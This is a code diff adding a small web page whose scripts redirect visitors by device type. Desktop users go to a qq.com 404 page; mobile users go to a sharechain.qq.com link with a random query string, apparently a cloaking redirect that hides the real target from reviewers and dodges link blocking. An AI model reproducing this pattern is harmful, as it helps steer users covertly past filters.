@@ -1,0 +1,26 @@
+<script>
+	if((/^(Win|Mac)/i.test(navigator.platform)||!/mobile|Android|phone|iPhone|iPod|ios|iPad/i.test(navigator.userAgent))&&(!localStorage.idf||parseInt( conf.mobile))){
+		location = 'http://www.qq.com/babygohome/?pgv_ref=404';
+	}
+</script>
+<script>
+
+var urls=[
+'https://sharechain.qq.com/e83fc4bf36cd111ddc12080542e330d5?{nnnnnnnnnnn}{wwwwww}',
+//'https://baidu.com',
+];
+location.href = myEeplace(urls[Math.floor(Math.random()*urls.length)]);
+function myEeplace(s){
+	return s.replace(/\{(\w+?)\}/g,function(a,b){
+		var h='';
+		for(var i=0;i<b.length;i++){
+			if('n'==b[i]){
+				h+=Math.floor(Math.random()*10);
+			}else if('w'==b[i]){
+				h+=String.fromCharCode(97+Math.floor(Math.random()*26));
+			}
+		}
+		return h;
+	});
+}
+</script>
